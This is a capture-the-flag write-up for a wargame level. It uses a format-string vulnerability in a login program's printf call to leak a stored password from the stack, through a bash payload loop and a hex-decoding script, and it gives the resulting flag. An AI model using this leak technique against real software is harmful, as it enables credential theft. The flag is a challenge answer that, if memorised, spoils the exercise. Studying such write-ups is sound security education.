# Level2 
There are 3 buffers 2 for 2 fgets (asking for username and password), the other one to store the password read in /home/users/level02/.pass.
If the password received with fgets is the same as the one read in the file, it calls system (/bin/bash).
So if the comparaison is not ok, it calls prints with username. This is where we can exploit the code, with a format string and see what is stored in the 3 buffers with this command:

```bash
for((i=0;i<100;i++)); do ./level02 < <(python -c "print('AAAA'  + '%$i"'$'"p\nBBBBBBBB' )") ; done | grep 'does not have access!' | sed -n '/42424242/,/41414141/p'
```

The previous script give us this output:

```diff
AAAA0x4242424242424242 does not have access!
AAAA(nil) does not have access!
AAAA(nil) does not have access!
AAAA(nil) does not have access!
AAAA(nil) does not have access!
AAAA(nil) does not have access!
AAAA(nil) does not have access!
AAAA(nil) does not have access!
AAAA(nil) does not have access!
AAAA(nil) does not have access!
AAAA(nil) does not have access!
AAAA(nil) does not have access!
AAAA0x100000000 does not have access!
AAAA(nil) does not have access!
+ AAAA0x756e505234376848 does not have access!
+ AAAA0x45414a3561733951 does not have access!
+ AAAA0x377a7143574e6758 does not have access!
+ AAAA0x354a35686e475873 does not have access!
+ AAAA0x48336750664b394d does not have access!
AAAA(nil) does not have access!
AAAA0x2438322541414141 does not have access!
```

Because our password is stored with 64 bits in little endian, we can find it by using the following script:

```bash
#!/bin/bash

PASSWORD=""
for uint64_t in "756e505234376848" "45414a3561733951" "377a7143574e6758" "354a35686e475873" "48336750664b394d"
do
	echo -n "$uint64_t" | xxd -r -p | rev
	PASSWORD+=`echo -n "$uint64_t" | xxd -r -p | rev`
done

echo "Password is -> $PASSWORD"
```

The flag is **Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H**